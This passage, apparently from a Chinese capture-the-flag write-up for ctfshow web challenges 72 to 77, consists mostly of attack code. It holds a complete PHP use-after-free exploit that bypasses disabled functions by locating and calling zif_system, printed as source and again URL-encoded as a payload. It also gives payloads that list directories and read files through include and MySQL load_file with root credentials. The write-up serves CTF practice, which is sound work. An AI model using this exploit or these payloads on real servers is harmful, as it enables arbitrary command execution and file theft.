</span></span><span class="line"><span class="cl">            $str[$p + $i] = sprintf(&#34;%c&#34;,($v &amp; 0xff));
</span></span><span class="line"><span class="cl">            $v &gt;&gt;= 8;
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function leak($addr, $p = 0, $s = 8) {
</span></span><span class="line"><span class="cl">        global $abc, $helper;
</span></span><span class="line"><span class="cl">        write($abc, 0x68, $addr + $p - 0x10);
</span></span><span class="line"><span class="cl">        $leak = strlen($helper-&gt;a);
</span></span><span class="line"><span class="cl">        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
</span></span><span class="line"><span class="cl">        return $leak;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function parse_elf($base) {
</span></span><span class="line"><span class="cl">        $e_type = leak($base, 0x10, 2);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        $e_phoff = leak($base, 0x20);
</span></span><span class="line"><span class="cl">        $e_phentsize = leak($base, 0x36, 2);
</span></span><span class="line"><span class="cl">        $e_phnum = leak($base, 0x38, 2);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        for($i = 0; $i &lt; $e_phnum; $i++) {
</span></span><span class="line"><span class="cl">            $header = $base + $e_phoff + $i * $e_phentsize;
</span></span><span class="line"><span class="cl">            $p_type  = leak($header, 0, 4);
</span></span><span class="line"><span class="cl">            $p_flags = leak($header, 4, 4);
</span></span><span class="line"><span class="cl">            $p_vaddr = leak($header, 0x10);
</span></span><span class="line"><span class="cl">            $p_memsz = leak($header, 0x28);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            if($p_type == 1 &amp;&amp; $p_flags == 6) {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
</span></span><span class="line"><span class="cl">                $data_size = $p_memsz;
</span></span><span class="line"><span class="cl">            } else if($p_type == 1 &amp;&amp; $p_flags == 5) {
</span></span><span class="line"><span class="cl">                $text_size = $p_memsz;
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        if(!$data_addr || !$text_size || !$data_size)
</span></span><span class="line"><span class="cl">            return false;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        return [$data_addr, $text_size, $data_size];
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function get_basic_funcs($base, $elf) {
</span></span><span class="line"><span class="cl">        list($data_addr, $text_size, $data_size) = $elf;
</span></span><span class="line"><span class="cl">        for($i = 0; $i &lt; $data_size / 8; $i++) {
</span></span><span class="line"><span class="cl">            $leak = leak($data_addr, $i * 8);
</span></span><span class="line"><span class="cl">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span><span class="line"><span class="cl">                $deref = leak($leak);
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                if($deref != 0x746e6174736e6f63)
</span></span><span class="line"><span class="cl">                    continue;
</span></span><span class="line"><span class="cl">            } else continue;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            $leak = leak($data_addr, ($i + 4) * 8);
</span></span><span class="line"><span class="cl">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span><span class="line"><span class="cl">                $deref = leak($leak);
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                if($deref != 0x786568326e6962)
</span></span><span class="line"><span class="cl">                    continue;
</span></span><span class="line"><span class="cl">            } else continue;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            return $data_addr + $i * 8;
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function get_binary_base($binary_leak) {
</span></span><span class="line"><span class="cl">        $base = 0;
</span></span><span class="line"><span class="cl">        $start = $binary_leak &amp; 0xfffffffffffff000;
</span></span><span class="line"><span class="cl">        for($i = 0; $i &lt; 0x1000; $i++) {
</span></span><span class="line"><span class="cl">            $addr = $start - 0x1000 * $i;
</span></span><span class="line"><span class="cl">            $leak = leak($addr, 0, 7);
</span></span><span class="line"><span class="cl">            if($leak == 0x10102464c457f) {
</span></span><span class="line"><span class="cl">                return $addr;
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function get_system($basic_funcs) {
</span></span><span class="line"><span class="cl">        $addr = $basic_funcs;
</span></span><span class="line"><span class="cl">        do {
</span></span><span class="line"><span class="cl">            $f_entry = leak($addr);
</span></span><span class="line"><span class="cl">            $f_name = leak($f_entry, 0, 6);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            if($f_name == 0x6d6574737973) {
</span></span><span class="line"><span class="cl">                return leak($addr + 8);
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">            $addr += 0x20;
</span></span><span class="line"><span class="cl">        } while($f_entry != 0);
</span></span><span class="line"><span class="cl">        return false;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function trigger_uaf($arg) {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
</span></span><span class="line"><span class="cl">        $vuln = new Vuln();
</span></span><span class="line"><span class="cl">        $vuln-&gt;a = $arg;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    if(stristr(PHP_OS, &#39;WIN&#39;)) {
</span></span><span class="line"><span class="cl">        die(&#39;This PoC is for *nix systems only.&#39;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    $n_alloc = 10;
</span></span><span class="line"><span class="cl">    $contiguous = [];
</span></span><span class="line"><span class="cl">    for($i = 0; $i &lt; $n_alloc; $i++)
</span></span><span class="line"><span class="cl">        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    trigger_uaf(&#39;x&#39;);
</span></span><span class="line"><span class="cl">    $abc = $backtrace[1][&#39;args&#39;][0];
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    $helper = new Helper;
</span></span><span class="line"><span class="cl">    $helper-&gt;b = function ($x) { };
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    if(strlen($abc) == 79 || strlen($abc) == 0) {
</span></span><span class="line"><span class="cl">        die(&#34;UAF failed&#34;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    $closure_handlers = str2ptr($abc, 0);
</span></span><span class="line"><span class="cl">    $php_heap = str2ptr($abc, 0x58);
</span></span><span class="line"><span class="cl">    $abc_addr = $php_heap - 0xc8;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    write($abc, 0x60, 2);
</span></span><span class="line"><span class="cl">    write($abc, 0x70, 6);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    write($abc, 0x10, $abc_addr + 0x60);
</span></span><span class="line"><span class="cl">    write($abc, 0x18, 0xa);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    $closure_obj = str2ptr($abc, 0x20);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    $binary_leak = leak($closure_handlers, 8);
</span></span><span class="line"><span class="cl">    if(!($base = get_binary_base($binary_leak))) {
</span></span><span class="line"><span class="cl">        die(&#34;Couldn&#39;t determine binary base address&#34;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    if(!($elf = parse_elf($base))) {
</span></span><span class="line"><span class="cl">        die(&#34;Couldn&#39;t parse ELF header&#34;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
</span></span><span class="line"><span class="cl">        die(&#34;Couldn&#39;t get basic_functions address&#34;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    if(!($zif_system = get_system($basic_funcs))) {
</span></span><span class="line"><span class="cl">        die(&#34;Couldn&#39;t get zif_system address&#34;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    $fake_obj_offset = 0xd0;
</span></span><span class="line"><span class="cl">    for($i = 0; $i &lt; 0x110; $i += 8) {
</span></span><span class="line"><span class="cl">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    write($abc, 0x20, $abc_addr + $fake_obj_offset);
</span></span><span class="line"><span class="cl">    write($abc, 0xd0 + 0x38, 1, 4);
</span></span><span class="line"><span class="cl">    write($abc, 0xd0 + 0x68, $zif_system);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    ($helper-&gt;b)($cmd);
</span></span><span class="line"><span class="cl">    exit();
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ctfshow(&#34;cat /flag0.txt&#34;);ob_end_flush();
</span></span></code></pre></td></tr></table>
</div>
</div><p>所以我们提交的payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=function%20ctfshow(%24cmd)%20%7b%20%20%20%20%20global%20%24abc%2c%20%24helper%2c%20%24backtrace%3b%20%20%20%20%20%20class%20vuln%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%3b%20%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3ea)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20(new%20exception)-%3egettrace()%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5b1%5d%5b&#39;args&#39;%5d))%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20debug_backtrace()%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20class%20helper%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%2c%20%24b%2c%20%24c%2c%20%24d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20str2ptr(%26%24str%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24address%20%3d%200%3b%20%20%20%20%20%20%20%20%20for(%24j%20%3d%20%24s-1%3b%20%24j%20%3e%3d%200%3b%20%24j--)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3c%3c%3d%208%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7c%3d%20ord(%24str%5b%24p%2b%24j%5d)%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24address%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20ptr2str(%24ptr%2c%20%24m%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24out%20%3d%20%22%22%3b%20%20%20%20%20%20%20%20%20for%20(%24i%3d0%3b%20%24i%20%3c%20%24m%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3d%20sprintf(%22%25c%22%2c(%24ptr%20%26%200xff))%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24out%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20write(%26%24str%2c%20%24p%2c%20%24v%2c%20%24n%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24i%20%3d%200%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24n%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24str%5b%24p%20%2b%20%24i%5d%20%3d%20sprintf(%22%25c%22%2c(%24v%20%26%200xff))%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20leak(%24addr%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20global%20%24abc%2c%20%24helper%3b%20%20%20%20%20%20%20%20%20write(%24abc%2c%200x68%2c%20%24addr%20%2b%20%24p%20-%200x10)%3b%20%20%20%20%20%20%20%20%20%24leak%20%3d%20strlen(%24helper-%3ea)%3b%20%20%20%20%20%20%20%20%20if(%24s%20!%3d%208)%20%7b%20%24leak%20%25%3d%202%20%3c%3c%20(%24s%20*%208)%20-%201%3b%20%7d%20%20%20%20%20%20%20%20%20return%20%24leak%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20parse_elf(%24base)%20%7b%20%20%20%20%20%20%20%20%20%24e_type%20%3d%20leak(%24base%2c%200x10%2c%202)%3b%20%20%20%20%20%20%20%20%20%20%24e_phoff%20%3d%20leak(%24base%2c%200x20)%3b%20%20%20%20%20%20%20%20%20%24e_phentsize%20%3d%20leak(%24base%2c%200x36%2c%202)%3b%20%20%20%20%20%20%20%20%20%24e_phnum%20%3d%20leak(%24base%2c%200x38%2c%202)%3b%20%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24e_phnum%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3d%20%24base%20%2b%20%24e_phoff%20%2b%20%24i%20*%20%24e_phentsize%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3d%20leak(%24header%2c%200%2c%204)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3d%20leak(%24header%2c%204%2c%204)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3d%20leak(%24header%2c%200x10)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3d%20leak(%24header%2c%200x28)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%206)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3d%20%24e_type%20%3d%3d%202%20%3f%20%24p_vaddr%20%3a%20%24base%20%2b%20%24p_vaddr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20if(%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%205)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20if(!%24data_addr%20%7c%7c%20!%24text_size%20%7c%7c%20!%24data_size)%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%20%20%20%20%20return%20%5b%24data_addr%2c%20%24text_size%2c%20%24data_size%5d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_basic_funcs(%24base%2c%20%24elf)%20%7b%20%20%20%20%20%20%20%20%20list(%24data_addr%2c%20%24text_size%2c%20%24data_size)%20%3d%20%24elf%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24data_size%20%2f%208%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24data_addr%2c%20%24i%20*%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak(%24leak)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3d%200x746e6174736e6f63)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24data_addr%2c%20(%24i%20%2b%204)%20*%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak(%24leak)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3d%200x786568326e6962)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2b%20%24i%20*%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7b%20%20%20%20%20%20%20%20%20%24base%20%3d%200%3b%20%20%20%20%20%20%20%20%20%24start%20%3d%20%24binary_leak%20%26%200xfffffffffffff000%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%200x1000%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24start%20-%200x1000%20*%20%24i%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24addr%2c%200%2c%207)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3d%3d%200x10102464c457f)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_system(%24basic_funcs)%20%7b%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24basic_funcs%3b%20%20%20%20%20%20%20%20%20do%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3d%20leak(%24addr)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3d%20leak(%24f_entry%2c%200%2c%206)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3d%3d%200x6d6574737973)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2b%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2b%3d%200x20%3b%20%20%20%20%20%20%20%20%20%7d%20while(%24f_entry%20!%3d%200)%3b%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20trigger_uaf(%24arg)%20%7b%20%20%20%20%20%20%20%20%20%20%24arg%20%3d%20str_shuffle(&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;)%3b%20%20%20%20%20%20%20%20%20%24vuln%20%3d%20new%20vuln()%3b%20%20%20%20%20%20%20%20%20%24vuln-%3ea%20%3d%20%24arg%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(stristr(php_os%2c%20&#39;win&#39;))%20%7b%20%20%20%20%20%20%20%20%20die(&#39;this%20poc%20is%20for%20*nix%20systems%20only.&#39;)%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24n_alloc%20%3d%2010%3b%20%20%20%20%20%20%24contiguous%20%3d%20%5b%5d%3b%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24n_alloc%3b%20%24i%2b%2b)%20%20%20%20%20%20%20%20%20%24contiguous%5b%5d%20%3d%20str_shuffle(&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;)%3b%20%20%20%20%20%20trigger_uaf(&#39;x&#39;)%3b%20%20%20%20%20%24abc%20%3d%20%24backtrace%5b1%5d%5b&#39;args&#39;%5d%5b0%5d%3b%20%20%20%20%20%20%24helper%20%3d%20new%20helper%3b%20%20%20%20%20%24helper-%3eb%20%3d%20function%20(%24x)%20%7b%20%7d%3b%20%20%20%20%20%20if(strlen(%24abc)%20%3d%3d%2079%20%7c%7c%20strlen(%24abc)%20%3d%3d%200)%20%7b%20%20%20%20%20%20%20%20%20die(%22uaf%20failed%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24closure_handlers%20%3d%20str2ptr(%24abc%2c%200)%3b%20%20%20%20%20%24php_heap%20%3d%20str2ptr(%24abc%2c%200x58)%3b%20%20%20%20%20%24abc_addr%20%3d%20%24php_heap%20-%200xc8%3b%20%20%20%20%20%20write(%24abc%2c%200x60%2c%202)%3b%20%20%20%20%20write(%24abc%2c%200x70%2c%206)%3b%20%20%20%20%20%20write(%24abc%2c%200x10%2c%20%24abc_addr%20%2b%200x60)%3b%20%20%20%20%20write(%24abc%2c%200x18%2c%200xa)%3b%20%20%20%20%20%20%24closure_obj%20%3d%20str2ptr(%24abc%2c%200x20)%3b%20%20%20%20%20%20%24binary_leak%20%3d%20leak(%24closure_handlers%2c%208)%3b%20%20%20%20%20if(!(%24base%20%3d%20get_binary_base(%24binary_leak)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn&#39;t%20determine%20binary%20base%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24elf%20%3d%20parse_elf(%24base)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn&#39;t%20parse%20elf%20header%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24basic_funcs%20%3d%20get_basic_funcs(%24base%2c%20%24elf)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn&#39;t%20get%20basic_functions%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24zif_system%20%3d%20get_system(%24basic_funcs)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn&#39;t%20get%20zif_system%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20%20%24fake_obj_offset%20%3d%200xd0%3b%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%200x110%3b%20%24i%20%2b%3d%208)%20%7b%20%20%20%20%20%20%20%20%20write(%24abc%2c%20%24fake_obj_offset%20%2b%20%24i%2c%20leak(%24closure_obj%2c%20%24i))%3b%20%20%20%20%20%7d%20%20%20%20%20%20write(%24abc%2c%200x20%2c%20%24abc_addr%20%2b%20%24fake_obj_offset)%3b%20%20%20%20%20write(%24abc%2c%200xd0%20%2b%200x38%2c%201%2c%204)%3b%20%20%20%20%20%20write(%24abc%2c%200xd0%20%2b%200x68%2c%20%24zif_system)%3b%20%20%20%20%20%20%20(%24helper-%3eb)(%24cmd)%3b%20%20%20%20%20exit()%3b%20%7d%20%20ctfshow(%22cat%20%2fflag0.txt%22)%3bob_end_flush()%3b%20%3f%3e
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web73" class="headerLink">
    <a href="#web73" class="header-mark"></a>[web73]</h3><p>先读取目录：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s1">&#39;glob:///*&#39;</span><span class="p">);</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$a</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="nv">$f</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="p">);};</span><span class="k">exit</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>发现<code>flagc.txt</code>文件</p>
<p>发现可以直接include:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=include(&#39;/flagc.txt&#39;);exit();
</span></span></code></pre></td></tr></table>
</div>
</div><p>web74是相同的套路</p>
<h3 id="web75" class="headerLink">
    <a href="#web75" class="header-mark"></a>[web75]</h3><p>读取目录：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&#34; &#34;);};exit();
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后发现无法直接include，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag，payload如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="n">try</span> <span class="p">{</span><span class="o">$</span><span class="n">dbh</span> <span class="o">=</span> <span class="n">new</span> <span class="n">PDO</span><span class="p">(</span><span class="s1">&#39;mysql:host=localhost;dbname=ctftraining&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;root&#39;</span><span class="p">);</span><span class="n">foreach</span><span class="p">(</span><span class="o">$</span><span class="n">dbh</span><span class="o">-&gt;</span><span class="n">query</span><span class="p">(</span><span class="s1">&#39;select load_file(&#34;/flag36.txt&#34;)&#39;</span><span class="p">)</span> <span class="n">as</span> <span class="o">$</span><span class="n">row</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="n">echo</span><span class="p">(</span><span class="o">$</span><span class="n">row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;|&#34;</span><span class="p">;</span> <span class="p">}</span><span class="o">$</span><span class="n">dbh</span> <span class="o">=</span> <span class="n">null</span><span class="p">;}</span><span class="n">catch</span> <span class="p">(</span><span class="n">PDOException</span> <span class="o">$</span><span class="n">e</span><span class="p">)</span> <span class="p">{</span><span class="n">echo</span> <span class="o">$</span><span class="n">e</span><span class="o">-</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span><span class="n">getMessage</span><span class="p">();</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);}</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>web76是同样的套路</p>
<h3 id="web77" class="headerLink">
    <a href="#web77" class="header-mark"></a>[web77]</h3><p>读取目录发现flag36x.txt和readflag
<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171534209.png" title="image-20230707171534209" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171534209.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171534209.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171534209.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171534209.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707171534209.png 2x"
